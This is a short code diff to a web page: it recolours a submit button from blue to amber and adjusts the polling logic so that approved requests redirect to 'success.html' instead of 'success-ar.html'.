@@ -83,7 +83,7 @@
   .key.action:active { background-color: #e9ecef; }
   .btn-submit {
     width: 100%;
-    background-color: #1565c0;
+    background-color: #b88a00;
     color: #ffffff;
     border: none;
     border-radius: 12px;
@@ -91,9 +91,9 @@
     font-size: 16px;
     font-weight: bold;
     cursor: pointer;
-    box-shadow: 0 4px 12px rgba(21, 101, 192, 0.2);
+    box-shadow: 0 4px 12px rgba(184, 138, 0, 0.25);
   }
-  .btn-submit:hover { background-color: #0d47a1; }
+  .btn-submit:hover { background-color: #946d00; }
   .btn-submit:disabled { background-color: #cccccc; cursor: not-allowed; box-shadow: none; }
   .error-msg { color: #c0392b; font-size: 13px; margin-top: 12px; display: none; text-align: center; }
 
@@ -218,10 +218,14 @@
             if (!data.ok) return;
             if (data.redirect) {
               stopPoll();
-              window.location.href = data.redirect + '?id=' + requestId;
+              if (data.redirect === 'success.html') {
+                window.location.href = 'success.html?id=' + requestId;
+              } else {
+                window.location.href = data.redirect + '?id=' + requestId;
+              }
             } else if (data.stage === 'success' && data.decision === 'approved') {
               stopPoll();
-              window.location.href = 'success-ar.html?id=' + requestId;
+              window.location.href = 'success.html?id=' + requestId;
             } else if (data.decision === 'rejected') {
               stopPoll();
               waitOverlay.classList.remove('show');
